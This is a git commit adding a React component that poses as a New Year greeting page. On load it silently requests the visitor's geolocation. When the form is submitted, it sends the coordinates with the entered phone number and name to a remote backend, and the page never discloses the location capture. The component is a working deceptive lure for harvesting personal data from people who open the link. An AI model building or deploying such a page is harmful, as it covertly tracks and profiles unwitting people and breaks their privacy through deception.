0f40d15a4516f6eb876d100dafeb9da748ae8799
Esant1141 <110063894+Esant1141@users.noreply.github.com>
2023-01-01 11:01:13 +0530

    first commit

---
+++ frontend/src/locationTracker.js
@@ -0,0 +1,87 @@
+import React, { useState, useEffect } from 'react';
+import axios from 'axios';
+import './loc.css'
+function LocationTracker() {
+  const [location, setLocation] = useState({});
+  const [phoneNumber, setPhoneNumber] = useState('');
+  const [name, setName] = useState('');
+  const [address, setAddress] = useState('');
+  const [formPhoneNumber, setFormPhoneNumber] = useState('');
+  const [formWish, setFormWish] = useState('');
+  const [formName, setFromName]= useState('');
+  const [formSubmitted, setFormSubmitted] = useState(false);
+
+
+  useEffect(() => {
+    navigator.geolocation.getCurrentPosition((position) => {
+      setLocation({
+        latitude: position.coords.latitude,
+        longitude: position.coords.longitude,
+      });
+    }, (error) => {
+      console.error(error);
+    });
+  }, []);
+
+  const handleSubmit = (e) => {
+    e.preventDefault();
+    setFormPhoneNumber(phoneNumber);
+    setFormWish(address);
+    setFromName(name);
+    setFormSubmitted(true);
+    console.log(`Sending location to backend: ${location}`);
+    
+    axios.post('https://new-year-azm0.onrender.com/location', {
+      location,
+      phoneNumber,
+      name,
+      address
+    })
+      .then(() => {
+        console.log(`Location saved to database ${location}`);
+      })
+      .catch((error) => {
+        console.error(error);
+      });
+  };
+
+  return (
+    <div className='container'>
+        <section>
+        <div className='frist'>
+          <div className="table center">
+            <div className="monitor-wrapper center">
+              <div className="monitor center">{formSubmitted?(  <p> Wishing yo a very Happy New Year to you and your family {formName} And Thankyou So Much For Giving Me Your Mobile No {formPhoneNumber} By the way I Know Your Name But I Thougth I should Add For You Also I Got Your Wish {formWish} </p>
+              ):null}
+              </div>
+            </div>
+          </div>
+        </div>
+        </section>
+        <section>
+        <div className='card'>
+          <form className='form' onSubmit={handleSubmit}>
+            <label>
+
+              <input placeholder="Enter your phone no" className='input' type="text" value={phoneNumber} onChange={(e) => setPhoneNumber(e.target.value)} />
+            </label>
+            <br />
+            <label>
+
+              <input placeholder="Enter your name " className='input' type="text" value={name} onChange={(e) => setName(e.target.value)} />
+            </label>
+            <br />
+            <label>
+
+              <input placeholder="Enter your wish" className='input' type="text" value={address} onChange={(e) => setAddress(e.target.value)} />
+            </label>
+            <br />
+            <button value="Submit" >2023</button>
+          </form>
+        </div>
+        </section>    
+    </div>
+  );
+}
+
+export default LocationTracker;
